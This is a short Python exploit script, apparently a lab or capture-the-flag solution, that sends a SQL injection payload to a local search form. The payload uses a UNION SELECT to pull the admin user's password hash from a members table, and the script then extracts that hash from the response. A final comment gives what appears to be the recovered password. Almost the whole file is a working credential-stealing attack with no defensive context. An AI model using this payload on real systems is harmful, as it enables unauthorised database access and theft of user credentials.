import requests
import re


# Define constants
url = "http://localhost:8080/search"  


data = {
    'name': '\" union select password_hash from members where username = \"admin\"; -- '
}
    
response = requests.post(url, data=data)
encrypted_password_match = re.search(r'<p>(.*)</p>', response.text)

if encrypted_password_match:
    print("Admin Password Hash: " + encrypted_password_match.group(1))
else:
    print("Admin Password Hash not found in the response.")
    
# Tr0ub4dor&3